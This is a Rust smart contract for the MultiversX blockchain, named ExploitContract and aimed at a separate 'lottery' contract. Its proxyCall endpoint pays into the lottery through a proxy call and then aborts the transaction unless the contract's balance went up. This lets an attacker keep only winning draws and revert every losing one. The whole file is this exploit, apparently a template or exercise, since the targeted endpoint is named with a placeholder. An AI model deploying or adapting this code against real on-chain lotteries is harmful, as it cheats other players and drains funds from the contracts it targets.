#![no_std]

use lottery::ProxyTrait as _;

multiversx_sc::imports!();

#[multiversx_sc::contract]
pub trait ExploitContract {
    #[init]
    fn init(&self, address: ManagedAddress) {
        self.lottery_address().set(address);
    }

    #[proxy]
    fn contract_proxy(&self, sc_address: ManagedAddress) -> lottery::Proxy<Self::Api>;

    #[view(LotteryAddress)]
    #[storage_mapper("lottery_address")]
    fn lottery_address(&self) -> SingleValueMapper<ManagedAddress>; 

    #[endpoint(proxyCall)]
    fn caller_endpoint(&self, amount: BigUint) {
        let lottery_address = self.lottery_address().get();
        let sc_address = self.blockchain().get_sc_address();

        let balance_before = self.blockchain().get_balance(&sc_address);
        let _: IgnoreValue = self
            .contract_proxy(lottery_address.clone())
            .endpoint_name()
            .with_egld_transfer(amount.clone())
            .execute_on_dest_context();

        let balance_after = self.blockchain().get_balance(&sc_address);

        require!(balance_after > balance_before , "Abort transaction");
    }
}
